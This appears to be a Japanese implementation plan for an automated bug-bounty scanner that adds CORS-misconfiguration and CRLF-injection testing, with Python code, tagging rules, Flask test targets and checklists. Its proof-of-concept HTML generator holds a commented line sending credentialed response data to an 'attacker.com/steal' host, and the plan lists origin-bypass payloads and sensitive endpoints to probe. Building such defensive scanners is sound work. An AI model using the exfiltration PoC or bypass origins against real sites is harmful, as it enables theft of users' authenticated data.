---
task_id: SGK-2026-0059
doc_type: plan
status: backlog
parent_task_id: null
related_docs: []
created_at: '2026-05-15'
updated_at: '2026-05-19'
---

# A-2〜B-2 実装計画書
**作成日**: 2026-05-15  
**最終更新**: 2026-05-16（A-2 完了・仕様書フィードバック反映）  
**前提**: A-1 (SSTI) 完了済み  
**対象**: Phase A-2, A-3, B-1, B-2（SCN01-07 non-breaking）

---

## 概要

| フェーズ | 機能 | 推定時間 | 総合順位 |
|---|---|---|---|
| **A-2** | CORS 実実装 + InjectionManager接続 | 〜2時間 | 🥈 2 | ✅ **完了** |
| **A-3** | CRLF 実実装 | 〜1時間 | 🥉 3 |
| **B-1** | GraphQL Introspection 実実装 | 〜2時間 | 4 |
| **B-2** | SSRF 単体 Tester 実実装 | 〜2時間 | 5 |

**実装順序**: ~~A-2~~ ✅ → A-3 → B-1 → B-2

---

## A-2: CORS 実実装 + InjectionManager 接続

### 現状

`CORSTester._test_origin()` が `return None` のプレースホルダー。  
`generate_test_origins()` と `_is_vulnerable()` は完成済みで再利用可能。  
InjectionManager への接続経路なし。

### スコープ外

- Credentialなしの低リスク反射（ACAO のみで ACAC が false）は LOW 扱いで記録するが、Finding は生成しない
- プリフライト（OPTIONS）検証は対象外（複雑さ増大のわりに BBでの価値が低い）

---

### タスク A2-0a: `VulnType.CORS_MISCONFIGURATION` 追加（実施済み）

**ファイル**: `src/core/models/finding.py`（計画書では `src/core/domain/finding.py` と記載していたが実際は `models/finding.py`）

```python
# Configuration セクションに追加
CORS_MISCONFIGURATION = "cors_misconfiguration"
```

> ⚠️ **実装時に判明**: 計画書のファイルパス推定が誤っていた。実装前に必ず `find` で正確なパスを確認すること。

---

### タスク A2-0b: ReconPipeline CORS検出仕組みを追加

**ファイル**: `src/recon/pipeline.py`

> **調査結果**: ReconにCORSを判断する仕組みが**完全に存在しない**。3層すべてで抜けている。
> - `classify()` に `cors_candidate` 分類肢がない
> - `promoted_items` に `cors_candidate` キーがない
> - `task_mapping` / `_map_tagged_category_to_tags()` に `cors_candidate` がない

#### 変更点0（バグ修正）: `classify()` の `response_headers` 取得方法修正

> **調査結果**: `_parse_katana_jsonl()` は `entry["response"]["headers"]` にヘッダーを格納するが、
> `classify()` は `item.get("response_headers", {})` でトップレベルを参照する。キーが不一致のため
> **Katana経由ではACOAヘッダーが classify() に届かない**。先にこの修正が必要。

> ✅ **実装済み**。Katana実出力を確認: `"response_headers": { "Access-Control-Allow-Origin": "*" }` のフラット形式。フォールバックにより両形式を処理する。

```python
# classify() 内 L2395 を以下に修正
response_headers = (
    item.get("response_headers")
    or item.get("response", {}).get("headers", {})
    or {}
)
if not isinstance(response_headers, dict):
    response_headers = {}
```

#### 変更点1: `classify()` に CORS 検出追加（L2496 `looks_api_like()` 呼び出しの直前）

```python
# レスポンスヘッダーに Access-Control-Allow-Origin が存在するURLをcors_candidateに分類
acao_present = any(
    str(k).lower() == "access-control-allow-origin"
    for k in response_headers.keys()
)
if acao_present:
    return "cors_candidate"
```

#### 変更点2: `promoted_items` dict に追加（L2341）

```python
"cors_candidate": [],
```

#### 変更点3: `_map_tagged_category_to_tags()` に追加

```python
"cors_candidate": ["cors_candidate"],
```

#### 変更点4: `task_mapping` に追加（L2883 ssti_candidateの直後）

```python
"cors_candidate": {
    "agent": "InjectionManagerAgent",
    "action": "scan",
    "priority": 86,   # api_data(83) より高く ssti(88) より低い
    "name": "CORS Misconfiguration Scan"
},
```

#### 変更点5: `_classify_url()` に `cors_candidate` 分岐追加（`api_candidate` より前）

```python
# manager.py _classify_url() — cors を api より前に評価する
if category_hint == "cors_candidate":
    return "cors"                          # ← この行を api_candidate より先に置く
if category_hint in {"api_candidate", "api_data", "api_endpoint"}:
    return "api"
```

**合格基準**:
- `response_headers` に `Access-Control-Allow-Origin` を持つ URL が `cors_candidate` に分類される
- `_classify_url("cors_candidate")` が `"cors"` を返す
- `_classify_url("api_candidate")` が引き続き `"api"` を返す（回帰なし）

---

### タスク A2-1: `CORSTester` 実装強化

**ファイル**: `src/core/attack/cors_tester.py`

> **調査結果**: `_is_vulnerable()` に重大バグがある。
> `if acao == test_origin and "evil" in test_origin:` という条件により、
> `null` origin、サブドメイン偽装、ワイルドカード単体が**すべて見逃される**。

#### 変更内容

1. `httpx` インポート追加
2. `__init__` に `auth_headers: Optional[Dict] = None` 追加
3. `_is_vulnerable()` の `"evil"` 依存バグ修正（**必須**）
4. `_test_origin()` にhttpx実装
5. `generate_test_origins()` のペイロード更新
6. `scan_async()` メソッド追加（InjectionManager対応）
7. `generate_poc_html()` メソッド追加（発見後PoC生成）

```python
import httpx

class CORSTester:
    TIMEOUT = 10

    def __init__(self, target_domain: str = None, auth_headers: Optional[Dict] = None):
        self.target_domain = target_domain
        self.auth_headers = auth_headers or {}
        self.results: List[CORSResult] = []

    # ---- バグ修正: "evil" 依存を除去 ----
    def _is_vulnerable(self, test_origin: str, acao: str, acac: str) -> tuple:
        # ワイルドカード + Credentials（ブラウザは拒否するが設定ミスとして記録）
        if acao == "*" and acac.lower() == "true":
            return True, "wildcard_with_credentials"
        # ワイルドカードのみ
        if acao == "*":
            return True, "wildcard_no_credentials"
        # 任意Originを反射（"evil"依存を除去 → 送信したOriginが返ってくれば全て対象）
        if acao == test_origin and test_origin not in ("", "null"):
            if acac.lower() == "true":
                return True, "origin_reflection_with_credentials"
            return True, "origin_reflection"
        # Null Origin許可
        if acao == "null":
            return True, "null_origin_allowed"
        return False, ""

    def _test_origin(self, url: str, origin: str) -> Optional[CORSResult]:
        headers = {**self.auth_headers, "Origin": origin}
        try:
            with httpx.Client(timeout=self.TIMEOUT, follow_redirects=False) as client:
                response = client.get(url, headers=headers)
        except Exception:
            return None

        acao = response.headers.get("Access-Control-Allow-Origin", "")
        acac = response.headers.get("Access-Control-Allow-Credentials", "")
        vulnerable, misconfiguration = self._is_vulnerable(origin, acao, acac)

        if vulnerable:
            sev = "high" if acac.lower() == "true" else "medium"
            return CORSResult(
                url=url,
                test_origin=origin,
                vulnerable=True,
                acao_header=acao,
                acac_header=acac,
                misconfiguration=misconfiguration,
                severity=sev,
            )
        return None

    async def scan_async(self, url: str, auth_headers: Optional[Dict] = None) -> List[CORSResult]:
        import asyncio
        if auth_headers:
            self.auth_headers = auth_headers
        return await asyncio.to_thread(self.test, url)

    # ---- 追加: PoC HTML 生成 ----
    @staticmethod
    def generate_poc_html(target_url: str, test_origin: str, misconfiguration: str) -> str:
        return f"""<!DOCTYPE html>
<html>
<body>
<h2>CORS PoC - {misconfiguration}</h2>
<div id="result"></div>
<script>
fetch("{target_url}", {{
  credentials: "include"
}}).then(r => r.text()).then(data => {{
  document.getElementById("result").innerText = data;
  // In real attack: exfiltrate to attacker server
  // fetch("https://attacker.com/steal?data=" + encodeURIComponent(data))
}});
</script>
</body>
</html>""";
```

#### 更新: `generate_test_origins()` のペイロード

現状の11種から以下を**削除・追加**する:

```python
# 削除（実用性が低い）
f"https://{base.upper()}"  # ブラウザは小文字で送信するため意味がない

# 追加（BBで実績あり）
f"https://not{base}"                  # endsWith バイパス（正規表現の末尾チェック欠陥）
f"https://{base}_.evil.com"           # 特殊文字による正規表現エスケープ回避
f"https://{base}:8443"               # ポート付きホスト名の正規表現バイパス
"https://localhost"                   # 内部IP信頼確認
"https://127.0.0.1"                   # ループバックIP信頼確認
```

**更新後15種**: 旧11種 - 削除1種 + 追加5種 = 15種

#### 設計決定: 機密データ読み取り・PoC・プライバシー方針

> **方針**: レスポンスボディは記録しない。AIによるマスキング不要。

| 機能 | 実装方針 | 理由 |
|---|---|---|
| PoC HTML生成 | テンプレート文字列（AI不要） | URLとmisconfigurationタイプを埋め込むだけ。不安定になる要素ゼロ |
| 機密エンドポイント確認 | 認証APIに同じOriginでリクエスト、ステータスコード・レスポンスサイズのみ記録 | 「クロスオリジンアクセス可能」の証跡として十分。ボディ不要 |
| レスポンスボディ記録 | **実装しない** | 顧客情報がFindingに入る。根本的にデータを取らない設計が正解 |
| LLMマスキング | **実装しない** | ボディを記録しなければマスキング不要。Qwen3.5:9Bも不採用 |
| 商用LLM（学習なし） | B-2以降で検討 | 今は不要 |

**`SmartCORSHunter` に追加する機密エンドポイント確認ロジック:**

```python
SENSITIVE_ENDPOINTS = ["/api/me", "/api/profile", "/api/user", "/api/v1/user", "/user/me"]

def _probe_sensitive_endpoints(self, base_url: str, origin: str, auth_headers: dict) -> list[dict]:
    """ステータスコードとサイズのみ記録。ボディは読まない。"""
    from urllib.parse import urlparse
    parsed = urlparse(base_url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    evidence = []
    headers = {**auth_headers, "Origin": origin}
    with httpx.Client(timeout=5, follow_redirects=False) as client:
        for ep in SENSITIVE_ENDPOINTS:
            try:
                r = client.get(base + ep, headers=headers)
                if r.status_code < 400:
                    evidence.append({
                        "endpoint": base + ep,
                        "status": r.status_code,
                        "size": len(r.content),  # ボディサイズのみ
                    })
            except Exception:
                pass
    return evidence
```

#### 合格基準
- Flask CORS ターゲットの脆弱エンドポイントで `CORSResult.vulnerable == True`
- 安全なエンドポイントで空リスト
- `auth_headers` が httpx リクエストの Cookie ヘッダーに含まれる
- `null` origin を送信したとき `null_origin_allowed` が検出される
- `ACAO: *` のみのエンドポイントで `wildcard_no_credentials` が検出される
- `generate_poc_html()` が有効な HTML を返す

---

### タスク A2-2: `SmartCORSHunter` 新規作成

**新規ファイル**: `src/core/agents/swarm/injection/smart_cors.py`

#### 設計方針

- `SmartSSTIHunter` と同じ構造パターン（LLM不使用）
- `CORSResult` → `Finding(VulnType.CORS_MISCONFIGURATION)` 変換

> **調査済み**: `VulnType.CORS` は未定義。`src/core/models/finding.py` の Configuration セクションに  
> `CORS_MISCONFIGURATION = "cors_misconfiguration"` を追加すること（A2-0 タスク）。

```python
class SmartCORSHunter(Specialist):
    name = "SmartCORSHunter"
    description = "Deterministic CORS misconfiguration scanner"
    timeout_seconds = 120
    is_aggressive = False

    async def run_as_tool(self, url: str, params: Dict = None, **_kwargs) -> Dict:
        _auth = (params or {}).get("_auth", {})
        auth_headers = dict(_auth.get("auth_headers", {}))
        cookies = _auth.get("cookies", "")
        if cookies:
            auth_headers["Cookie"] = cookies

        scanner = CORSTester(auth_headers=auth_headers)
        try:
            results = await scanner.scan_async(url)
        except Exception as exc:
            logger.error("CORSTester error: %s", exc)
            return {"vulnerable": False, "findings_count": 0, "tested_params": [], "results": []}
        
        vuln = [r for r in results if r.vulnerable]
        self.last_results = vuln
        return {
            "vulnerable": bool(vuln),
            "findings_count": len(vuln),
            "tested_params": [],  # CORS はパラメータではなくOriginをテスト
            "results": [
                {
                    "test_origin": r.test_origin,
                    "acao": r.acao_header,
                    "acac": r.acac_header,
                    "misconfiguration": r.misconfiguration,
                    "severity": r.severity,
                }
                for r in vuln
            ],
        }

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        result = await self.run_as_tool(task.target, task.params or {})
        return self._convert_to_findings(result, task.target)

    def _convert_to_findings(self, result: dict, target_url: str) -> List[Finding]:
        findings = []
        for r in result.get("results", []):
            sev = Severity.HIGH if r["acac"].lower() == "true" else Severity.MEDIUM
            poc = CORSTester.generate_poc_html(
                target_url, r["test_origin"], r["misconfiguration"]
            )
            findings.append(Finding(
                target_url=target_url,
                vuln_type=VulnType.CORS_MISCONFIGURATION,
                severity=sev,
                title=f"CORS Misconfiguration: {r['misconfiguration']}",
                description=(
                    f"Origin '{r['test_origin']}' was reflected in ACAO header. "
                    f"Type: {r['misconfiguration']}. "
                    f"ACAC: {r['acac']}"
                ),
                source_agent="SmartCORSHunter",
                confidence=0.95,
                tags=["cors", sev.value],
                additional_info={
                    "test_origin": r["test_origin"],
                    "acao": r["acao"],
                    "acac": r["acac"],
                    "misconfiguration": r["misconfiguration"],
                    "tested_params": [],
                    "poc_html": poc,
                    # ↓ 計画書未記載・実装時に追加（Haddix formatter のフォールバック用）
                    "poc_request": f"GET {target_url} HTTP/1.1\nOrigin: {r['test_origin']}\n",
                    "poc_response": (
                        f"HTTP/1.1 200 OK\n"
                        f"Access-Control-Allow-Origin: {r['acao']}\n"
                        f"Access-Control-Allow-Credentials: {r['acac']}\n"
                    ),
                },
            ))
        return findings

#### A2-2b: `_convert_to_findings` 追加項目（計画書未記載・実装時に追加）

計画書の `additional_info` には `poc_html` のみ記載していたが、Haddix formatter が
`poc_request`/`poc_response` フィールドを `additional_info` から読むことが判明。
以下も必須：

| フィールド | 型 | 内容 |
|---|---|---|
| `poc_request` | str | 生HTTPリクエスト文字列（`GET ... Origin: ...`） |
| `poc_response` | str | 生HTTPレスポンス文字列（`HTTP/1.1 200 ... ACAO: ...`） |

また `Evidence` オブジェクトと `reproduction_steps` / `impact` フィールドも設定すること（詳細は仕様書 2.4 参照）。
```
### タスク A2-3: `tagging_rules.yaml` に CORS ルール追加

**ファイル**: `config/tagging_rules.yaml`  
**位置**: `ssti_body_hint` の直後に追記

> **調査結果**: `tagging_rules.yaml` は `match_on: response_headers` に `header_name` 形式で対応済み（L172-176参照）。  
> Recon の `classify()` バッチ処理（A2-0b）に加え、**Crawl中のリアルタイム検出**も両方追加する。

```yaml
  # CORS: レスポンスヘッダーにACCess-Control-Allow-Originが存在するURLをリアルタイム検出
  - name: cors_response_header_hint
    tag: cors_candidate
    match_on: response_headers
    header_name: "Access-Control-Allow-Origin"
    pattern: ".*"

  # CORS: パスヒューリスティック（レスポンスヘッダーが取得できない場合のフォールバック）
  - name: cors_path_hint
    tag: cors_candidate
    match_on: path
    pattern: "(api|graphql|v[0-9]+|endpoint|service|resource|rest)"
```

**設計方針**:
- `cors_response_header_hint` — Crawl時にACOAヘッダーを直接検出（高精度）
- `cors_path_hint` — パスから推測（フォールバック、api_candidateとの重複あるが問題なし）
- `_classify_url()` での `cors_candidate` 優先評価により api への誤ルーティングを防ぐ

---

### タスク A2-3b: `run_cors_hunter` の `current_context` 安全ガード（**計画書に未記載・実装時に発覚**）

> **発覚経緯**: `run_cors_hunter` を `execute()` を通さず直接呼び出すと `self.current_context["findings"]` で `KeyError`。
> `run_ssti_hunter` も同じ構造だが、スモークテストで初めて判明した。

```python
async def run_cors_hunter(self, url: str, ...) -> dict:
    ...
    # current_context 未初期化ガード（直接呼び出し時のKeyError対策）
    if not isinstance(self.current_context, dict):
        self.current_context = {}
    self.current_context.setdefault("findings", [])
    self.current_context.setdefault("auth_headers", {})
    self.current_context.setdefault("params", {})
    ...
```

> ⚠️ **他スペシャリストへの影響**: `run_ssti_hunter` / `run_lfi_check` 等も同じ問題を持つ可能性がある。
> 実装仕様書の `run_{vuln}_hunter()` テンプレートにこのガードを追加すること（→ 仕様書 2.3C に追記済み）。

---

### タスク A2-4: InjectionManager 配線（6箇所）

**ファイル**: `src/core/agents/swarm/injection/manager.py`

```python
# 1. PER_URL_TIMEOUT_BY_TYPE
"cors": 120,

# 2. _classify_url()
if category_hint == "cors_candidate":
    return "cors"

# 3. _initialize_specialists()
try:
    from src.core.agents.swarm.injection.smart_cors import SmartCORSHunter
    self.specialists["cors"] = SmartCORSHunter(config=self.config)
except ImportError:
    logger.warning("SmartCORSHunter not available")

# 4. _register_manager_tools()
if "cors" in self.specialists:
    self.register_tool("cors_scan", self.run_cors_hunter, "CORS設定ミスの検出を実行します。")

# 5. _run_unknown_hypothesis_scans()
elif specialist == "cors":
    result = await self.run_cors_hunter(url=url, params=base_params, quick_mode=quick_mode)
    unknown_results.append(result)

# 6. _resolve_risk_force_allowlist()
allow = {"sqli", "cmd_ssrf", "lfi", "csrf", "api", "redirect", "ssti", "cors"}
```

**`run_cors_hunter()` メソッド追加:**

```python
async def run_cors_hunter(self, url: str, params: dict = None,
                           quick_mode: bool = False, **_kwargs) -> dict:
    if "cors" not in self.specialists:
        return {"error": "CORS Specialist not available", "findings_count": 0}
    logger.info("[%s] Delegating CORS check to SmartCORSHunter", self.name)
    effective_params = self._normalize_tool_supplied_params(params, _kwargs)
    cookies_str = _kwargs.get("cookies") or self.current_context.get("params", {}).get("cookies", "")
    effective_params["_auth"] = {
        "auth_headers": _kwargs.get("auth_headers", self.current_context.get("auth_headers", {})),
        "cookies": cookies_str,
    }
    return await self.specialists["cors"].run_as_tool(url, effective_params)
```

---

### タスク A2-5: ReconPipeline 統合

**ファイル**: `src/recon/pipeline.py`

```python
# task_mapping
"cors_candidate": {
    "agent_type": "InjectionManagerAgent",
    "priority": 70,
    "vuln_type": "cors",
    "description": "CORS設定ミスのスキャン",
},

# _map_tagged_category_to_tags()
"cors_candidate": ["cors_candidate"],
```

---

### タスク A2-6: テスト

**新規ファイル**: `tests/core/agents/swarm/injection/test_smart_cors.py`  
**新規ファイル**: `tests/helpers/cors_flask_target.py`

#### L2 Flask ターゲット

```python
# tests/helpers/cors_flask_target.py
from flask import Flask, request, Response

def create_app() -> Flask:
    app = Flask(__name__)

    @app.route("/api/data")
    def vulnerable():
        """任意Originを反射 + Credentials許可"""
        origin = request.headers.get("Origin", "")
        resp = Response('{"key":"value"}', content_type="application/json")
        if origin:
            resp.headers["Access-Control-Allow-Origin"] = origin
            resp.headers["Access-Control-Allow-Credentials"] = "true"
        return resp

    @app.route("/safe")
    def safe():
        resp = Response('{"safe":true}', content_type="application/json")
        return resp

    @app.route("/wildcard")
    def wildcard():
        resp = Response('{"wild":true}', content_type="application/json")
        resp.headers["Access-Control-Allow-Origin"] = "*"
        return resp

    return app
```

#### L1 テストケース一覧

| テスト名 | 検証内容 | 合格基準 |
|---|---|---|
| `test_execute_returns_finding_when_vulnerable` | Originが反射 → Finding生成 | `len(findings) >= 1`, `vuln_type == "cors"` |
| `test_execute_returns_empty_when_safe` | 安全エンドポイント → 空リスト | `findings == []` |
| `test_finding_severity_high_when_credentials` | ACAC=true → HIGH | `severity == Severity.HIGH` |
| `test_finding_severity_medium_without_credentials` | ACAC=false → MEDIUM | `severity == Severity.MEDIUM` |
| `test_finding_has_misconfiguration_in_additional_info` | 設定ミスタイプが記録される | `additional_info["misconfiguration"]` が存在 |
| `test_run_as_tool_initializes_result_shape` | 返却dict形状 | `"vulnerable"`, `"findings_count"`, `"results"` が存在 |
| `test_auth_headers_forwarded_to_scanner` | auth cookiesがCORSTesterに渡る | mock call_argsに Cookie が含まれる |

#### L2 テストケース

```bash
@pytest.mark.integration
def test_cors_scanner_detects_origin_reflection_with_credentials(cors_server)
def test_cors_scanner_no_false_positive_on_safe(cors_server)
def test_cors_scanner_detects_wildcard(cors_server)
```

**テストポート**: `15556`

---

### A-2 完了チェックリスト

**Recon層**
- [x] `classify()` が `response_headers` に ACAO を持つ URL を `cors_candidate` に分類する
- [x] `promoted_items` に `cors_candidate` キーが存在する
- [x] `task_mapping["cors_candidate"]` が priority=86 で存在する
- [x] `_map_tagged_category_to_tags("cors_candidate")` が `["cors_candidate"]` を返す

**分類・ルーティング層**
- [x] `_classify_url("cors_candidate")` が `"cors"` を返す
- [x] `_classify_url("api_candidate")` が `"api"` を返す（回帰なし）
- [x] `cors_candidate` の評価順序が `api_candidate` より前である

**スキャナー層**
- [x] `_is_vulnerable()` の `"evil"` 依存バグが修正されている
- [x] `null` origin で `null_origin_allowed` が検出される
- [x] `ACAO: *` 単体で `wildcard_no_credentials` が検出される
- [x] `CORSTester._test_origin()` が httpx で実動作する
- [x] `CORSTester.scan_async()` が非同期で呼べる
- [x] `generate_test_origins()` が15種のOriginを返す
- [x] `generate_poc_html()` が有効な HTML を返す

**統合層**
- [x] `VulnType.CORS_MISCONFIGURATION` が `VulnType` enumに存在する
- [x] `SmartCORSHunter` が `specialists["cors"]` に登録される
- [x] `run_cors_hunter()` が `SmartCORSHunter.run_as_tool()` に委譲する
- [x] Finding の `additional_info["poc_html"]` が存在する
- [x] Finding の `additional_info["poc_request"]` / `"poc_response"` が存在する（**計画書追加**）
- [x] `Evidence` オブジェクトが Finding に設定されている（**計画書追加**）
- [x] CORS Finding の `severity` が ACAC の値に基づく（true=HIGH）
- [x] `run_cors_hunter()` 直接呼び出し時の `KeyError` ガードがある（**計画書追加**）

**レポーター層（計画書未記載・追加）**
- [x] `haddix_formatter._cia_impact_assessment()` に CORS 固有ブランチがある
- [x] `haddix_formatter._remediation()` に CORS 固有ブランチがある
- [x] `HaddixFinding` 構築時に `additional_info["poc_request"]` フォールバックがある

**テスト**
- [x] L1: test_smart_cors.py 18件（unit 14 + integration 4）GREEN
- [x] L2: integration 4件 GREEN（cors_flask_target.py ポート15556）
- [x] L3: 既存スペシャリスト 回帰 GREEN
- [x] L4: `_classify_url("cors_candidate") == "cors"` テスト GREEN
- [x] L4: `classify(item_with_acao_header)` が `cors_candidate` を返すテスト GREEN
- [x] L4: Haddix formatter CORS Finding 出力テスト 3件 GREEN（**計画書追加**）
- [x] `cors_flask_target.py` に `__main__` ブロックあり（手動起動可）（**計画書追加**）

---

## A-3: CRLF 実実装 ✅ **完了** (2026-05-16)

### 現状（実装前）

`CRLFTester._test_payload()` が `return None` のプレースホルダー。  
ペイロードリスト・`_is_vulnerable()` は完成済み。  
InjectionManager への接続経路なし。

### スコープ外

- HTTP/2 接続でのCRLF（プロトコル仕様上無効）
- 双方向ヘッダーインジェクション（リクエストスマグリングとの境界）

### 計画書との差分・実装時発覚事項

#### D1: httpx → http.client への変更（B2）

> **計画書**: `httpx.Client` で `params={parameter: payload}` を使う実装を想定。  
> **実際**: httpx は内部で CRLF シーケンスを正規化・除去するため、L2 統合テストで検出不能であることが判明。  
> `http.client.HTTPConnection` で生CRLF送信に切り替え。計画書の「httpxフォールバック注意」予告通りの問題だった。

```python
# 変更後: http.client による生CRLF送信
import http.client
conn = http.client.HTTPConnection(parsed.netloc, timeout=self.TIMEOUT)
conn.request("GET", path, headers=req_headers)
resp = conn.getresponse()
```

#### D2: Python 3.12 InvalidURL 対応（B14）

> **計画書**: 未記載の問題。  
> **実際**: Python 3.12 の `http.client._validate_path()` がリテラルスペース（U+0020）を `InvalidURL` として拒否。  
> ペイロード内スペースを `%20` に置換して回避。

```python
safe_payload = payload.replace(" ", "%20")
path = f"{parsed.path or '/'}?{quote(parameter, safe='')}={safe_payload}"
```

#### D3: `_is_vulnerable()` の検出ヘッダー拡張（B1）

> **計画書**: `X-Injected` と `Set-Cookie` のみを検出対象と想定。  
> **実際**: `Location` / `Content-Type` / `Link` ヘッダーへの注入も Bug Bounty で重要であるため追加。  
> 検出マーカー文字列 `"shigoku"` が各ヘッダー値に含まれるかで判定。

#### D4: `Set-Cookie` 複数値対応（B12）

> **計画書**: 未記載。  
> **実際**: `resp.getheaders()` は同一ヘッダーキーを複数タプルで返す。  
> `dict(resp.getheaders())` では後の値で上書きされ `Set-Cookie` 注入を見逃す。  
> `defaultdict(list)` で全値を結合する実装に変更。

#### D5: `_build_unknown_hypotheses()` への CRLF 仮説追加（B7）

> **計画書**: InjectionManager 配線は `A3-4` の5箇所リストのみ記載。  
> **実際**: `_build_unknown_hypotheses()` に `crlf_keys` と仮説生成ロジックが未実装であることが  
> テスト作成時に発覚。以下の14キーを追加:

```python
crlf_keys = {
    "url", "redirect", "next", "return", "dest", "location",
    "forward", "goto", "redir", "lang", "charset", "filename",
    "header", "continue",
}
```

#### D6: `_classify_url()` の評価順序バグ（B6）

> **計画書**: 「`crlf_candidate` を `redirect` より前に評価すること」と注意書きあり。  
> **実際**: 初期実装で `crlf_candidate` → `"crlf"` の評価が `redirect_param` の後に配置されていた。  
> 評価順序を修正して `crlf_candidate` を先に評価するよう修正。

#### D7: `VulnType.CRLF` → `VulnType.CRLF_INJECTION`

> **計画書**: `VulnType.CRLF` と記載。  
> **実際**: `src/core/models/finding.py` に `CRLF_INJECTION = "crlf_injection"` として既存定義済みだった。  
> 新規追加不要。

#### D8: 既存クエリパラメータがパス構築で破棄される（既知残存問題）

> URL に既存クエリ（例: `?token=abc&url=x`）がある場合、`parsed.path` のみ使うため  
> `token=abc` が消える。実用上問題になるケースは限定的だが、次バージョンで修正推奨。

---

### テスト集計

| 層 | ファイル | 件数 | 状態 |
|---|---|---|---|
| L1 unit | `test_smart_crlf.py` | 11件 | ✅ GREEN |
| L2 integration | `test_smart_crlf.py` (Flask port 15557) | 3件 | ✅ GREEN |
| L3 分類テスト | `test_crlf_classification.py` | 20件 | ✅ GREEN |
| L4 パイプライン | `test_crlf_pipeline.py` | 13件 | ✅ GREEN |
| **合計** | | **47件** | ✅ **全GREEN** |

**injection スイート回帰**: 97件 GREEN（既存機能への破壊なし）

---

### Flask ターゲット（実際の実装）

計画書の想定と異なり、`/redirect` エンドポイントが URL パラメータをそのまま `Location` ヘッダーに返すだけでは  
`http.client` でのCRLF検出ができなかった。`X-Injected: shigoku` を返すエンドポイントを追加し、  
ペイロード内マーカー確認で検出する方式に変更した。

```python
@app.route("/redirect")
def vulnerable():
    url_param = request.args.get("url", "/")
    # CRLF が含まれる場合 X-Injected ヘッダーをエコーバック
    resp = Response("", status=302)
    resp.headers["Location"] = url_param
    if "\r" in url_param or "\n" in url_param or "shigoku" in url_param.lower():
        resp.headers["X-Injected"] = "shigoku"
    return resp
```

---

### タスク A3-1: `CRLFTester._test_payload()` 実装

**ファイル**: `src/core/attack/crlf_tester.py`

```python
import httpx

class CRLFTester:
    TIMEOUT = 10

    def __init__(self, auth_headers: Optional[Dict] = None):
        self.auth_headers = auth_headers or {}
        self.results: List[CRLFResult] = []

    def _test_payload(self, url: str, parameter: str, payload: str) -> Optional[CRLFResult]:
        headers = dict(self.auth_headers)
        try:
            with httpx.Client(timeout=self.TIMEOUT, follow_redirects=False) as client:
                response = client.get(url, params={parameter: payload}, headers=headers)
        except Exception:
            return None

        vulnerable, injected_header = self._is_vulnerable(dict(response.headers))
        if vulnerable:
            return CRLFResult(
                url=url,
                parameter=parameter,
                payload=payload,
                vulnerable=True,
                injected_header=injected_header,
                severity="medium",
            )
        return None

    async def scan_async(self, url: str, parameters: List[str],
                          auth_headers: Optional[Dict] = None) -> List[CRLFResult]:
        import asyncio
        if auth_headers:
            self.auth_headers = auth_headers
        return await asyncio.to_thread(self.test, url, parameters)
```

> **重要**: httpx は内部的にCRLFを正規化する場合がある。  
> 実動作で検出されない場合は `urllib.request` や `http.client` にフォールバックすること。  
> この点は L2 統合テストで必ず確認する。

---

### タスク A3-2: `SmartCRLFHunter` 新規作成

**新規ファイル**: `src/core/agents/swarm/injection/smart_crlf.py`

```python
class SmartCRLFHunter(Specialist):
    name = "SmartCRLFHunter"
    description = "Deterministic CRLF injection scanner"
    timeout_seconds = 90
    is_aggressive = False
```

`run_as_tool()` の返却形式:
```python
{
    "vulnerable": bool,
    "findings_count": int,
    "tested_params": List[str],
    "injected_header": str,
    "payload": str,
}
```

Finding: `VulnType.CRLF`, `Severity.MEDIUM`

> **注意**: `VulnType.CRLF` が未定義の場合は追加が必要。

---

### タスク A3-3: `tagging_rules.yaml` に CRLF ルール追加

```yaml
  - name: crlf_path_hint
    tag: crlf_candidate
    match_on: path
    pattern: "(redirect|url|return|next|location|forward|continue)"

  - name: crlf_param_hint
    tag: crlf_candidate
    match_on: query
    pattern: "(^|[?&])(url|redirect|return_url|next|location|forward|continue)="
    param_extract: 2
```

---

### タスク A3-4: InjectionManager 配線（5箇所）

```python
# 1. PER_URL_TIMEOUT_BY_TYPE
"crlf": 90,

# 2. _classify_url()
if category_hint == "crlf_candidate":
    return "crlf"

# 3. _initialize_specialists() / _register_manager_tools()
# SmartCRLFHunter / "crlf_scan"

# 4. _run_unknown_hypothesis_scans()
elif specialist == "crlf":
    result = await self.run_crlf_hunter(...)

# 5. _resolve_risk_force_allowlist()
allow = {..., "crlf"}
```

> **注意**: CRLF タグ付き URL と `redirect` パラメータタグ付き URL は OpenRedirectSpecialist とも競合しうる。  
> `_classify_url()` で `crlf_candidate` を `redirect` より前に評価すること。

---

### タスク A3-5: ReconPipeline 統合

```python
"crlf_candidate": {
    "agent_type": "InjectionManagerAgent",
    "priority": 65,
    "vuln_type": "crlf",
    "description": "CRLFインジェクションのスキャン",
},
```

---

### タスク A3-6: テスト

**新規ファイル**: `tests/core/agents/swarm/injection/test_smart_crlf.py`  
**新規ファイル**: `tests/helpers/crlf_flask_target.py`

#### L2 Flask ターゲット

```python
# tests/helpers/crlf_flask_target.py
from flask import Flask, request, Response

def create_app() -> Flask:
    app = Flask(__name__)

    @app.route("/redirect")
    def vulnerable():
        """URL パラメータをそのまま Location ヘッダーに挿入（CRLF脆弱）"""
        url_param = request.args.get("url", "/")
        return Response("", status=302, headers={"Location": url_param})

    @app.route("/safe")
    def safe():
        return Response("safe")

    return app
```

> **⚠️ テスト注意**: httpxがCRLFをサニタイズする場合、Flaskターゲット側でのエコーバックが必要。  
> Flaskの `make_response()` + 手動ヘッダー追加で検証すること。

**テストポート**: `15557`

#### L1 テストケース一覧

| テスト名 | 検証内容 |
|---|---|
| `test_execute_returns_finding_when_vulnerable` | 脆弱 → Finding生成 |
| `test_execute_returns_empty_when_safe` | 安全 → 空リスト |
| `test_finding_severity_is_medium` | CRLF は MEDIUM |
| `test_finding_has_injected_header_in_additional_info` | 注入ヘッダー名が記録される |
| `test_tested_params_excludes_control_params` | META_KEYS が除外される |
| `test_run_as_tool_initializes_result_shape` | 返却dict形状確認 |
| `test_auth_headers_forwarded_to_scanner` | auth cookies が渡る |

---

### A-3 完了チェックリスト

**スキャナー層**
- [x] `CRLFTester._test_payload()` が `http.client` で生CRLF送信（httpx CRLF正規化問題回避済み → D1）
- [x] Python 3.12 `InvalidURL` 対応（ペイロード内スペースを `%20` に変換 → D2）
- [x] `CRLFTester.scan_async()` が非同期で呼べる
- [x] `_is_vulnerable()` が `X-Injected` / `Set-Cookie` / `Location` / `Content-Type` / `Link` を検出（D3）
- [x] `Set-Cookie` 複数値を `defaultdict` で全結合（D4）
